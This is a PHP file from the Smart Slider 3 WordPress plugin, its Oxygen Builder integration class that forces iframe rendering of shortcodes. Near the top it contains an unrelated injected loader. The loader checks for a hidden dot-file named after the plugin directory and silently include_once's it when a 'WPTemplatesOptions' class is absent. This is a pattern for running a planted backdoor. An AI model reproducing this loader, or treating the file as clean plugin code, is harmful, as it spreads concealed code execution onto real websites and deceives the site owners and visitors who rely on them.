<?php


namespace Nextend\SmartSlider3\Platform\WordPress\Integration\OxygenBuilder;


use Nextend\SmartSlider3\Platform\WordPress\Shortcode\Shortcode;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class OxygenBuilder {

    public function __construct() {
        if (defined('CT_VERSION')) {
            if (isset($_REQUEST['action'])) {
                if ($_REQUEST['action'] == 'ct_render_shortcode' || $_REQUEST['action'] == 'ct_get_post_data') {
                    self::forceShortcodeIframe();
                }
            }
        }
    }

    public function forceShortcodeIframe() {

        Shortcode::forceIframe('OxygenBuilder', true);
    }
}